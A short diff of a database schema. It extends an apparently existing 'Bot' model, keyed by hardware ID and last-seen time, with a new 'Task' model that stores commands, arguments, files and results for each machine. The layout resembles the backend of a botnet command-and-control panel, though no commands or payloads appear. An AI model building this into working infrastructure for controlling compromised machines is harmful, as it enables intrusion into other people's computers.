@@ -26,3 +26,13 @@ model Bot {
   lastSeen DateTime? @updatedAt 
   hwid String? @unique
 }
+
+model Task {
+  id    Int     @default(autoincrement()) @id
+  taskId String? @unique
+  hwid String?
+  command String?
+  arguments String?
+  file String?
+  result String?
+}
